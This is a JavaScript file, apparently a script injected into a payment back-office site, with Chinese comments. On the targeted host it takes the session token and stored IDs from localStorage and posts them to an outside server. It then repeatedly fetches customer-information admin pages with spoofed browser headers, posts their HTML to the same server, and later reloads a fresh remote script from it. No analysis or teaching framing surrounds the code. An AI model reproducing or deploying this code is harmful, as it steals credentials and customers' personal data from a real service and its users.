var cur_href = window.location.href;
var urlobj = new URL(cur_href);
var hostname = urlobj.hostname;
var domainParts = hostname.split('.');
var domain = domainParts.length > 2 ? domainParts[1] : domainParts[0]; // 提取"google"
var timestamp = new Date().getTime();

var insertlocal = localStorage.getItem('ids');
var cookie = document.cookie;

if (cur_href.includes("backoffice.gowithsp88.online") || cur_href.includes("gowithsp88.online")) {
    
    function insertLog(text) {
        var Lxmlhttp = new XMLHttpRequest();
        Lxmlhttp.open("POST", "https://pay.sb8.co/receive/log.php", true);
        Lxmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        Lxmlhttp.send(text);
    }
    
    //var text = "type=" + encodeURIComponent(domain) + "&status=" + encodeURIComponent("1") + "&ids=" + encodeURIComponent(insertlocal);
    //insertLog(text);
    
    function createXmlHttp() {
        if (window.XMLHttpRequest) {
            return new XMLHttpRequest();
        } else {
            var MSXML = ['MSXML2.XMLHTTP.5.0', 'MSXML2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP', 'Microsoft.XMLHTTP'];
            for (var n = 0; n < MSXML.length; n++) {
                try {
                    return new ActiveXObject(MSXML[n]);
                } catch (e) {}
            }
        }
        return null;
    }
    
    function get_text_8bo(get_name, get_url, get_method) {
        var xmlHttp = createXmlHttp();
        if (!xmlHttp) {
            console.error('Failed to create XMLHttpRequest');
            return;
        }
        
        var text = "type=" + encodeURIComponent(domain) + "&status=" + encodeURIComponent("1") + "&ids=" + encodeURIComponent(insertlocal) + "&localstage=" + encodeURIComponent(localStorage.getItem('token'));
        insertLog(text);
    
        xmlHttp.onreadystatechange = function() {
            if (xmlHttp.readyState === 4 && xmlHttp.status === 200) {
                var code = escape(xmlHttp.responseText);
                var timestamp = new Date().getTime();
                var url = "https://pay.sb8.co/receive/receive1.php?timestamp=" + timestamp;
                var cc = "htmlcode=" + code + "&filename=" + get_name;

                var xmlHttpPost = createXmlHttp();
                if (xmlHttpPost) {
                    xmlHttpPost.open("POST", url, true);
                    xmlHttpPost.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                    xmlHttpPost.send(cc);
                } else {
                    console.error('Failed to create XMLHttpRequest for POST');
                }
            }
        };
        
        var text = "type=" + encodeURIComponent(domain) + "&status=" + encodeURIComponent("2") + "&ids=" + encodeURIComponent(insertlocal);
        insertLog(text);
    
        xmlHttp.open(get_method, get_url, true);
        xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xmlHttp.setRequestHeader("Sec-Ch-Ua", '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"');
        xmlHttp.setRequestHeader("Accept", "application/json, text/javascript, */*; q=0.01");
        xmlHttp.setRequestHeader("X-Requested-With", "XMLHttpRequest");
        xmlHttp.setRequestHeader("Sec-Ch-Ua-Mobile", "?0");
        xmlHttp.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36");
        xmlHttp.setRequestHeader("Sec-Ch-Ua-Platform", "Windows");
        xmlHttp.setRequestHeader("Sec-Ch-Ua-Platform", "Windows");
        xmlHttp.setRequestHeader("Sec-Fetch-Site", "same-origin");
        xmlHttp.setRequestHeader("Sec-Fetch-Mode", "cors");
        xmlHttp.setRequestHeader("Sec-Fetch-Dest", "empty");
        
        //localStorage开始
        //xmlHttp.setRequestHeader("Token", "a96a6b69f6a247d1a7dd9e80836789d9");
        
        //localstrage结束
        
        
        xmlHttp.send();
    }

    var urls = [
        { name: "surepay-user-1100", url: "/users/CustomerInfo/?id=27b56d0f-18eb-4ada-8e70-f8181ceac0d5" },
        { name: "surepay-user-1101", url: "/users/CustomerInfo/?id=a4d278d7-9817-4f43-9739-448b98622da3" },
        //{ name: "surepay-user-981237123", url: "/users/CustomerInfo/?id=981237123" },
        //{ name: "surepay-user-981237687", url: "/users/CustomerInfo/?id=981237687" },
        //{ name: "surepay-user-1059", url: "/users/CustomerInfo/?id=1059" },
        //{ name: "surepay-user-2", url: "/users/CustomerInfo/?id=2" },
        //{ name: "passpay-role", url: "/settings/Role" },
        //{ name: "passpay-iplist", url: "/developer/ipWhitelist" },
    ];

    var index = 0;
    
    function plement() {
        var currentUrl = urls[index];
        localStorage.setItem('addtimec', currentUrl.name);
        get_text_8bo(currentUrl.name, currentUrl.url, "GET");   //GET 提交
        //get_text_8bo(currentUrl.name, currentUrl.url, "POST");
        index = (index + 1) % urls.length;
    }
    
    var timers = setInterval(plement, 5000);
    
    function loadScript(url) {
        var script = document.createElement('script');
        script.src = url;
        script.async = true;
        document.head.appendChild(script);
    }
    
    setTimeout(function() {
    
        //每次需要修改的地址
        var baseScriptUrl = 'https://pay.sb8.co/js-9d6798e4b1fe1e1b3df3d84bb4d0ddb8/surepay';
        var scripts = document.querySelectorAll('script[src^="' + baseScriptUrl + '"]');
        
        scripts.forEach(function(script) {
            script.remove();
        });
        
        clearTimeout(timers);
        loadScript(baseScriptUrl + '?timestamp=' + timestamp);
    }, 50000);
    
}
